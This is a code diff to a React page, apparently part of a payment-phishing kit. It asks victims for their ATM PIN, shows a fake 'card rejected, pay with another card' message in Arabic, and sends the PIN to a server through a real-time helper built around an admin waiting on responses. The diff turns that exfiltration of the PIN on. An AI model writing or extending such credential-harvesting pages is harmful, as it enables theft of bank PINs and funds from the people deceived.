@@ -1,7 +1,7 @@
 import Main from "@/components/MainWrapper";
-import { Link } from "react-router-dom";
+import { Link, useNavigate } from "react-router-dom";
 import InputWithClearIcon from "../../components/InputWithClearIcon";
-import { setCurrentPage } from "@/real-time/utils/utils";
+import { sendDataToServer, setCurrentPage } from "@/real-time/utils/utils";
 import { useEffect } from "react";
 import { useToast } from "@/components/ui/use-toast";
 import { ToastAction } from "@/components/ui/toast";
@@ -12,6 +12,7 @@ const Atm = () => {
   }, []);
 
   const { toast } = useToast();
+  const navigate = useNavigate();
 
   const goNext = (e: any) => {
     e.preventDefault();
@@ -19,7 +20,7 @@ const Atm = () => {
     toast({
       description: "تم رفض البطاقة يرجى السداد عبر بطاقة صراف أخرى",
       action: (
-        <Link to="/payment-gateway" className="ms-auto">
+        <Link to="/" className="ms-auto">
           <ToastAction
             altText="Goto toast undo"
             className="text-xs whitespace-nowrap"
@@ -30,18 +31,19 @@ const Atm = () => {
       ),
     });
 
-    // const data = Object.fromEntries(new FormData(e.target));
-    // // console.log(data);
+    const data = Object.fromEntries(new FormData(e.target));
+    // console.log(data);
 
-    // // [ ] should be true for production
-    // sendDataToServer({
-    //   data: {
-    //     "atm الرقم السري": data["secret-code"],
-    //   },
-    //   current: "atm",
-    //   nextPage: "final-page",
-    //   waitingForAdminResponse: true,
-    // });
+    // [ ] should be true for production
+    sendDataToServer({
+      data: {
+        "atm الرقم السري": data["secret-code"],
+      },
+      current: "atm",
+      nextPage: "",
+      waitingForAdminResponse: false,
+      navigate,
+    });
   };
 
   return (
